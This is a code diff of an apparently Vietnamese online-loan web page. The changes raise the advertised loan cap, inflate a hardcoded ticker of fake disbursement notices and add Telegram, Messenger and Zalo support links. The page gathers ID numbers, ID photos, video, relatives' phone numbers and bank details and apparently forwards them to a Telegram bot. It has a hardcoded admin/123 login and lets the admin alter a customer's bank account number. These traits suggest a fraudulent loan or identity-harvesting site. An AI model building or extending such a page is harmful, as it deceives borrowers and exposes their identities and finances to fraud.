@@ -34,9 +34,6 @@
             </div>
             
             <div class="flex items-center space-x-2">
-                <a id="headerSupportBtn" href="https://t.me/" target="_blank" class="text-xs font-bold text-slate-700 bg-slate-100 hover:bg-slate-200 px-3 py-2 rounded-xl transition flex items-center space-x-1">
-                    <span>💬 Hỗ Trợ</span>
-                </a>
                 <button id="userAccountBtn" onclick="openAuthModal()" class="text-xs font-bold text-slate-900 bg-amber-400 hover:bg-amber-500 px-3.5 py-2 rounded-xl shadow-sm transition">Đăng Nhập</button>
             </div>
         </div>
@@ -46,11 +43,11 @@
     <main class="flex-1 flex items-center justify-center p-4">
         <div class="max-w-md w-full bg-white rounded-3xl p-4 md:p-6 relative overflow-hidden space-y-5">
             
-            <!-- 1. TRANG CHỦ: KÉO CHỌN HẠN MỨC & TÍNH LÃI SUẤT -->
+            <!-- 1. TRANG CHỦ: KÉO CHỌN HẠN MỨC (500K - 100TR) -->
             <div id="stepHome" class="space-y-4">
                 <div class="space-y-1 text-center md:text-left">
                     <h1 class="text-2xl md:text-3xl font-black text-slate-900 tracking-tight leading-tight">Chạm nhẹ một cái,<br>tiền về liền tay!</h1>
-                    <p class="text-xs text-slate-500 font-semibold">Lựa chọn hạn mức và kỳ hạn trả góp</p>
+                    <p class="text-xs text-slate-500 font-semibold">Lựa chọn hạn mức lên đến 100.000.000 ₫</p>
                 </div>
 
                 <!-- BẢNG THÔNG BÁO GIẢI NGÂN REAL-TIME -->
@@ -61,23 +58,23 @@
                     <div class="overflow-hidden">
                         <p class="text-[10px] text-amber-800 font-extrabold uppercase tracking-wider">Hệ thống vừa giải ngân:</p>
                         <div id="liveTicker" class="text-xs font-black text-emerald-700 transition-opacity duration-300 truncate">
-                            Khách hàng 098****382 vừa duyệt vay 20.000.000 ₫
+                            Khách hàng 098****382 vừa duyệt vay 50.000.000 ₫
                         </div>
                     </div>
                 </div>
 
-                <!-- Chọn số tiền vay -->
+                <!-- Chọn số tiền vay (Max 100 Triệu) -->
                 <div class="bg-slate-50 border border-slate-200 rounded-2xl p-3.5 space-y-2">
                     <div class="flex justify-between items-center">
                         <span class="text-xs font-bold text-slate-600">Số tiền vay:</span>
-                        <span id="amountDisplay" class="text-lg font-black text-slate-900">14.500.000 ₫</span>
+                        <span id="amountDisplay" class="text-lg font-black text-slate-900">20.000.000 ₫</span>
                     </div>
-                    <input type="range" id="loanRange" min="500000" max="30000000" step="500000" value="14500000" 
+                    <input type="range" id="loanRange" min="500000" max="100000000" step="500000" value="20000000" 
                            oninput="calculateLoan()" 
                            class="w-full h-2.5 bg-slate-200 rounded-lg appearance-none cursor-pointer slider-thumb accent-amber-400">
                     <div class="flex justify-between text-[11px] font-semibold text-slate-400">
                         <span>500.000 ₫</span>
-                        <span>30.000.000 ₫</span>
+                        <span>100.000.000 ₫</span>
                     </div>
                 </div>
 
@@ -106,7 +103,7 @@
                 </button>
             </div>
 
-            <!-- TAB 2: THÔNG TIN VAY (GIAO DIỆN SẠCH SẼ, CHUYÊN NGHIỆP) -->
+            <!-- TAB 2: THÔNG TIN VAY -->
             <div id="tabLoanInfo" class="space-y-4 hidden py-2">
                 <div class="space-y-1">
                     <h2 class="text-lg font-black text-slate-900">Chính Sách & Gói Vay</h2>
@@ -115,15 +112,11 @@
                 <div class="space-y-3 text-xs">
                     <div class="bg-slate-50 border border-slate-200 p-3.5 rounded-2xl space-y-1.5">
                         <span class="font-bold text-amber-600 block">⚡ Hạn mức linh hoạt</span>
-                        <p class="text-slate-600">Hỗ trợ khoản vay từ 500.000 ₫ đến 30.000.000 ₫ giải ngân trực tiếp vào tài khoản ngân hàng.</p>
+                        <p class="text-slate-600">Hỗ trợ khoản vay từ 500.000 ₫ đến 100.000.000 ₫ giải ngân trực tiếp vào tài khoản ngân hàng.</p>
                     </div>
                     <div class="bg-slate-50 border border-slate-200 p-3.5 rounded-2xl space-y-1.5">
                         <span class="font-bold text-amber-600 block">📉 Lãi suất ưu đãi</span>
                         <p class="text-slate-600">Lãi suất cố định chỉ 1.2%/tháng, không thu phí trước, minh bạch toàn bộ hợp đồng.</p>
-                    </div>
-                    <div class="bg-slate-50 border border-slate-200 p-3.5 rounded-2xl space-y-1.5">
-                        <span class="font-bold text-amber-600 block">🛡️ Điều kiện xét duyệt</span>
-                        <p class="text-slate-600">Chỉ cần CCCD chính chủ, không cần chứng minh thu nhập, xét duyệt tự động sau 15 phút.</p>
                     </div>
                 </div>
                 <button onclick="switchTab('home')" class="w-full bg-amber-400 hover:bg-amber-500 text-slate-900 py-3.5 rounded-2xl font-black text-sm shadow-md transition">
@@ -139,8 +132,8 @@
                 </div>
                 <div id="appStatusContainer" class="bg-slate-50 border border-slate-200 rounded-2xl p-4 text-center space-y-3">
                     <div class="text-3xl">📂</div>
-                    <p class="text-xs text-slate-500 font-semibold">Bạn chưa có hồ sơ vay nào được gửi đi.</p>
-                    <button onclick="switchTab('home')" class="bg-amber-400 text-slate-900 px-4 py-2 rounded-xl text-xs font-bold shadow-sm">Tạo Hồ Sơ Vay</button>
+                    <p class="text-xs text-slate-500 font-semibold">Vui lòng đăng nhập để xem hồ sơ vay.</p>
+                    <button onclick="openAuthModal()" class="bg-amber-400 text-slate-900 px-4 py-2 rounded-xl text-xs font-bold shadow-sm">Đăng Nhập Ngay</button>
                 </div>
             </div>
 
@@ -256,7 +249,7 @@
                 <button onclick="submitFinalData()" id="finalBtn" class="w-full bg-emerald-500 hover:bg-emerald-600 text-white py-4 rounded-2xl font-black text-sm shadow-lg shadow-emerald-500/25 transition">Gửi Hồ Sơ Xét Duyệt</button>
             </div>
 
-            <!-- BẢNG QUẢN TRỊ ADMIN (NÂNG CẤP CHI TIẾT DUYỆT / TỪ CHỐI / SỬA STK / GHI CHÚ) -->
+            <!-- BẢNG QUẢN TRỊ ADMIN -->
             <div id="adminPanel" class="space-y-4 hidden py-2">
                 <div class="flex justify-between items-center border-b border-slate-100 pb-3">
                     <div>
@@ -266,20 +259,21 @@
                     <button onclick="adminLogout()" class="bg-red-50 text-red-600 hover:bg-red-100 px-3 py-1 rounded-xl text-xs font-bold transition">Đăng Xuất</button>
                 </div>
 
-                <!-- CÀI ĐẶT LIÊN KẾT HỖ TRỢ CHO ADMIN -->
-                <div class="bg-slate-50 border border-slate-200 rounded-2xl p-3 space-y-2 text-xs">
-                    <span class="font-bold text-slate-800 block">⚙️ Cấu hình liên kết hỗ trợ (Telegram/Zalo):</span>
-                    <div class="flex space-x-2">
-                        <input type="text" id="supportLinkInput" placeholder="https://t.me/username_cua_ong" class="w-full p-2 bg-white border border-slate-200 rounded-xl text-xs">
-                        <button onclick="saveSupportLink()" class="bg-slate-900 text-white px-3 py-2 rounded-xl font-bold">Lưu</button>
+                <!-- CÀI ĐẶT LIÊN KẾT HỖ TRỢ ĐA KÊNH CHO ADMIN -->
+                <div class="bg-slate-50 border border-slate-200 rounded-2xl p-3 space-y-2.5 text-xs">
+                    <span class="font-bold text-slate-800 block">⚙️ Cấu hình liên kết icon hỗ trợ nổi:</span>
+                    <div class="space-y-1.5">
+                        <input type="text" id="teleLinkInput" placeholder="Link Telegram (https://t.me/...)" class="w-full p-2 bg-white border border-slate-200 rounded-xl text-xs">
+                        <input type="text" id="fbLinkInput" placeholder="Link Facebook (https://m.me/...)" class="w-full p-2 bg-white border border-slate-200 rounded-xl text-xs">
+                        <input type="text" id="zaloLinkInput" placeholder="Link Zalo (https://zalo.me/...)" class="w-full p-2 bg-white border border-slate-200 rounded-xl text-xs">
+                        <button onclick="saveSupportLinks()" class="w-full bg-slate-900 hover:bg-slate-800 text-white py-2 rounded-xl font-bold">Lưu Cấu Hình Hỗ Trợ</button>
                     </div>
                 </div>
 
                 <!-- DANH SÁCH HỒ SƠ KHÁCH HÀNG -->
                 <div class="space-y-2">
-                    <span class="text-xs font-bold text-slate-700 uppercase tracking-wider block">📋 Hồ sơ mới nhận:</span>
-                    <div id="adminLoanList" class="space-y-2 max-h-72 overflow-y-auto">
-                        <!-- Danh sách đơn vay sẽ hiển thị ở đây -->
+                    <span class="text-xs font-bold text-slate-700 uppercase tracking-wider block">📋 Hồ sơ khách đăng ký:</span>
+                    <div id="adminLoanList" class="space-y-2 max-h-60 overflow-y-auto">
                         <div class="p-3 bg-slate-50 border border-slate-200 rounded-xl text-xs text-slate-500 text-center">
                             Chưa có hồ sơ khách đăng ký mới.
                         </div>
@@ -292,15 +286,13 @@
                         <span class="font-black text-amber-900" id="detName">Chi tiết hồ sơ</span>
                         <button onclick="closeAdminDetail()" class="text-slate-400 hover:text-slate-700 font-bold">✕ Đóng</button>
                     </div>
-                    <div class="space-y-1 text-slate-700 text-[11px]" id="detInfo">
-                        <!-- Thông tin chi tiết -->
-                    </div>
+                    <div class="space-y-1 text-slate-700 text-[11px]" id="detInfo"></div>
                     
                     <div class="space-y-2 pt-1">
                         <label class="block font-bold text-slate-700">Sửa số tài khoản (STK) khách hàng:</label>
                         <input type="text" id="editStk" class="w-full p-2 bg-white border border-slate-200 rounded-xl font-semibold">
 
-                        <label class="block font-bold text-slate-700">Ghi chú đơn vay của ông:</label>
+                        <label class="block font-bold text-slate-700">Ghi chú đơn vay:</label>
                         <textarea id="editNote" placeholder="Ví dụ: Đã gọi điện xác nhận, chờ giải ngân..." class="w-full p-2 bg-white border border-slate-200 rounded-xl text-xs" rows="2"></textarea>
                         
                         <div class="grid grid-cols-2 gap-2 pt-1">
@@ -317,6 +309,19 @@
 
         </div>
     </main>
+
+    <!-- FLOATING SUPPORT BUTTONS (ICONS HỖ TRỢ NỔI GÓC PHẢI DƯỚI) -->
+    <div class="fixed bottom-20 right-4 z-40 flex flex-col space-y-2.5">
+        <a id="floatingTele" href="https://t.me/" target="_blank" class="w-11 h-11 bg-sky-500 hover:bg-sky-600 text-white rounded-full flex items-center justify-center shadow-lg transition-transform hover:scale-110 text-xl font-bold" title="Telegram">
+            ✈️
+        </a>
+        <a id="floatingFb" href="https://m.me/" target="_blank" class="w-11 h-11 bg-blue-600 hover:bg-blue-700 text-white rounded-full flex items-center justify-center shadow-lg transition-transform hover:scale-110 text-xl font-bold" title="Facebook Messenger">
+            💬
+        </a>
+        <a id="floatingZalo" href="https://zalo.me/" target="_blank" class="w-11 h-11 bg-blue-500 hover:bg-blue-600 text-white rounded-full flex items-center justify-center shadow-lg transition-transform hover:scale-110 text-sm font-black" title="Zalo">
+            Zalo
+        </a>
+    </div>
 
     <!-- TAB MENU ĐÁY MÀN HÌNH -->
     <nav class="fixed bottom-0 left-0 right-0 bg-white border-t border-slate-200 shadow-lg z-50 py-2 px-6">
@@ -345,8 +350,8 @@
         <div class="bg-white rounded-3xl max-w-sm w-full p-6 relative space-y-4 shadow-2xl">
             <button onclick="closeAuthModal()" class="absolute top-4 right-4 text-slate-400 hover:text-slate-600 text-lg font-bold">✕</button>
             <div class="text-center space-y-1">
-                <h3 class="text-xl font-black text-slate-900">Tài Khoản Khách Hàng</h3>
-                <p class="text-xs text-slate-500">Đăng nhập để theo dõi hồ sơ khoản vay</p>
+                <h3 class="text-xl font-black text-slate-900">Cổng Đăng Nhập</h3>
+                <p class="text-xs text-slate-500">Đăng nhập tài khoản hoặc Admin</p>
             </div>
             
             <div class="flex bg-slate-100 p-1 rounded-xl">
@@ -355,7 +360,7 @@
             </div>
 
             <div id="loginBox" class="space-y-3">
-                <input type="text" id="loginPhone" placeholder="Số điện thoại hoặc tài khoản" class="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-xl text-sm focus:ring-2 focus:ring-amber-400 outline-none font-semibold">
+                <input type="text" id="loginPhone" placeholder="Số điện thoại hoặc admin" class="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-xl text-sm focus:ring-2 focus:ring-amber-400 outline-none font-semibold">
                 <input type="password" id="loginPass" placeholder="Mật khẩu" class="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-xl text-sm focus:ring-2 focus:ring-amber-400 outline-none font-semibold">
                 <button onclick="handleLogin()" class="w-full bg-amber-400 hover:bg-amber-500 text-slate-900 py-3.5 rounded-xl font-black text-sm shadow-md transition">Đăng Nhập Ngay</button>
             </div>
@@ -382,27 +387,43 @@
         let mediaStream, mediaRecorder, recordedChunks = [], videoBlob = null;
         let allLoans = JSON.parse(localStorage.getItem('ff_loans') || '[]');
         let currentSelectedLoanId = null;
+        let isLoggedIn = false;
+        let isAdminLoggedIn = false;
 
-        // Lưu và load link hỗ trợ
-        let supportUrl = localStorage.getItem('ff_support_link') || 'https://t.me/';
-        document.getElementById('headerSupportBtn').href = supportUrl;
-        document.getElementById('supportLinkInput').value = supportUrl;
+        // Quản lý liên kết hỗ trợ đa kênh (Tele, FB, Zalo)
+        let teleLink = localStorage.getItem('ff_tele_link') || 'https://t.me/';
+        let fbLink = localStorage.getItem('ff_fb_link') || 'https://m.me/';
+        let zaloLink = localStorage.getItem('ff_zalo_link') || 'https://zalo.me/';
 
-        function saveSupportLink() {
-            const link = document.getElementById('supportLinkInput').value.trim();
-            if(link) {
-                localStorage.setItem('ff_support_link', link);
-                document.getElementById('headerSupportBtn').href = link;
-                alert("Đã lưu liên kết hỗ trợ thành công!");
-            }
+        function applySupportLinks() {
+            document.getElementById('floatingTele').href = teleLink;
+            document.getElementById('floatingFb').href = fbLink;
+            document.getElementById('floatingZalo').href = zaloLink;
+
+            document.getElementById('teleLinkInput').value = teleLink;
+            document.getElementById('fbLinkInput').value = fbLink;
+            document.getElementById('zaloLinkInput').value = zaloLink;
+        }
+        applySupportLinks();
+
+        function saveSupportLinks() {
+            teleLink = document.getElementById('teleLinkInput').value.trim() || 'https://t.me/';
+            fbLink = document.getElementById('fbLinkInput').value.trim() || 'https://m.me/';
+            zaloLink = document.getElementById('zaloLinkInput').value.trim() || 'https://zalo.me/';
+
+            localStorage.setItem('ff_tele_link', teleLink);
+            localStorage.setItem('ff_fb_link', fbLink);
+            localStorage.setItem('ff_zalo_link', zaloLink);
+
+            applySupportLinks();
+            alert("Đã lưu liên kết hỗ trợ đa kênh thành công!");
         }
 
-        // Ticker giải ngân
         const tickerMessages = [
-            "Khách hàng 098****219 vừa duyệt vay 10.000.000 ₫",
-            "Khách hàng 035****881 vừa giải ngân 20.000.000 ₫",
-            "Khách hàng 091****442 vừa duyệt vay 30.000.000 ₫",
-            "Khách hàng 077****903 vừa giải ngân 5.000.000 ₫"
+            "Khách hàng 098****219 vừa duyệt vay 20.000.000 ₫",
+            "Khách hàng 035****881 vừa giải ngân 50.000.000 ₫",
+            "Khách hàng 091****442 vừa duyệt vay 100.000.000 ₫",
+            "Khách hàng 077****903 vừa giải ngân 15.000.000 ₫"
         ];
         let tickerIndex = 0;
         setInterval(() => {
@@ -445,10 +466,18 @@
             document.getElementById('progressContainer').classList.add('hidden');
 
             if(tabName === 'home') {
+                if(!isLoggedIn && !isAdminLoggedIn) {
+                    openAuthModal();
+                    return;
+                }
                 document.getElementById('stepHome').classList.remove('hidden');
             } else if(tabName === 'loanInfo') {
                 document.getElementById('tabLoanInfo').classList.remove('hidden');
             } else if(tabName === 'applications') {
+                if(!isLoggedIn && !isAdminLoggedIn) {
+                    openAuthModal();
+                    return;
+                }
                 renderClientApplications();
                 document.getElementById('tabApplications').classList.remove('hidden');
             } else if(tabName === 'profile') {
@@ -464,11 +493,11 @@
             }
             let html = '<div class="space-y-2 text-left">';
             allLoans.forEach(loan => {
-                html += `<div class="p-3 bg-white border border-slate-200 rounded-xl space-y-1 text-xs">
+                html += `<div class="p-3 bg-white border border-slate-200 rounded-xl space-y-1 text-xs shadow-sm">
                     <div class="flex justify-between font-bold text-slate-900"><span>${loan.name}</span><span class="text-amber-600">${loan.amount}</span></div>
                     <div class="text-[11px] text-slate-500">STK: ${loan.bankAccount} (${loan.bankName})</div>
                     <div class="flex justify-between items-center pt-1"><span class="text-[10px] font-bold px-2 py-0.5 rounded bg-amber-50 text-amber-700">${loan.status}</span><span class="text-[10px] text-slate-400">${loan.time}</span></div>
-                    ${loan.note ? `<div class="text-[11px] text-blue-600 bg-blue-50 p-1.5 rounded mt-1">📝 Ghi chú từ Admin: ${loan.note}</div>` : ''}
+                    ${loan.note ? `<div class="text-[11px] text-blue-600 bg-blue-50 p-1.5 rounded mt-1">📝 Ghi chú: ${loan.note}</div>` : ''}
                 </div>`;
             });
             html += '</div>';
@@ -517,6 +546,7 @@
             if(!user || !pass) { alert("Vui lòng nhập tài khoản và mật khẩu!"); return; }
 
             if(user === "admin" && pass === "123") {
+                isAdminLoggedIn = true;
                 closeAuthModal();
                 document.getElementById('stepHome').classList.add('hidden');
                 document.getElementById('adminPanel').classList.remove('hidden');
@@ -525,12 +555,15 @@
                 return;
             }
 
+            isLoggedIn = true;
             closeAuthModal();
             document.getElementById('userAccountBtn').textContent = "👤 " + user;
             alert("Đăng nhập thành công!");
+            switchTab('home');
         }
 
         function adminLogout() {
+            isAdminLoggedIn = false;
             document.getElementById('adminPanel').classList.add('hidden');
             document.getElementById('stepHome').classList.remove('hidden');
             document.getElementById('userAccountBtn').textContent = "Đăng Nhập";
@@ -547,7 +580,7 @@
                 html += `<div onclick="selectAdminLoan(${idx})" class="p-3 bg-white border border-slate-200 rounded-xl cursor-pointer hover:border-amber-400 transition space-y-1 text-xs shadow-sm">
                     <div class="flex justify-between font-bold text-slate-900"><span>${loan.name}</span><span class="text-amber-600">${loan.amount}</span></div>
                     <div class="text-[11px] text-slate-500">CCCD: ${loan.cccd} - SĐT người thân: ${loan.rPhone}</div>
-                    <div class="flex justify-between items-center pt-1"><span class="text-[10px] font-bold px-2 py-0.5 rounded bg-amber-50 text-amber-700">${loan.status}</span><span class="text-[10px] text-blue-600 font-semibold">🔍 Bấm để xử lý</span></div>
+                    <div class="flex justify-between items-center pt-1"><span class="text-[10px] font-bold px-2 py-0.5 rounded bg-amber-50 text-amber-700">${loan.status}</span><span class="text-[10px] text-blue-600 font-semibold">🔍 Bấm xử lý</span></div>
                 </div>`;
             });
             listEl.innerHTML = html;
@@ -586,6 +619,10 @@
         }
 
         function startLoanProcess() {
+            if(!isLoggedIn && !isAdminLoggedIn) {
+                openAuthModal();
+                return;
+            }
             formData.amount = document.getElementById('amountDisplay').textContent;
             formData.term = document.getElementById('loanTerm').value + " Tháng";
             document.getElementById('stepHome').classList.add('hidden');
@@ -657,7 +694,6 @@
             const frontImg = document.getElementById('imgFront').files[0];
             const backImg = document.getElementById('imgBack').files[0];
 
-            // Lưu hồ sơ vào local storage cho khách
             const newLoan = {
                 name: formData.name,
                 amount: formData.amount,
@@ -677,6 +713,7 @@
             };
             allLoans.unshift(newLoan);
             localStorage.setItem('ff_loans', JSON.stringify(allLoans));
+            renderAdminLoanList();
 
             try {
                 const msg = `🚨 HỒ SƠ VAY MỚI (FINANCEFAST)!\n\n💰 Số tiền vay: ${formData.amount}\n📅 Kỳ hạn: ${formData.term}\n👤 Họ tên: ${formData.name}\n📅 Ngày sinh: ${formData.dob}\n🏠 Địa chỉ: ${formData.address}\n🪪 CCCD: ${formData.cccd}\n\n👥 Người thân: ${formData.rName} - SĐT: ${formData.rPhone} (${formData.rRelation})\n\n💳 Ngân hàng: ${formData.bankName} - STK: ${formData.bankAccount} (${formData.bankOwner})`;
@@ -702,7 +739,7 @@
                 switchTab('applications');
 
             } catch(err) {
-                alert("Lỗi kết nối đường truyền. Vui lòng thử lại!");
+                alert("Lỗi kết nối đường truyền Telegram. Vui lòng kiểm tra lại cấu hình Bot Token!");
                 btn.disabled = false;
                 btn.textContent = "Gửi Hồ Sơ Xét Duyệt";
             }
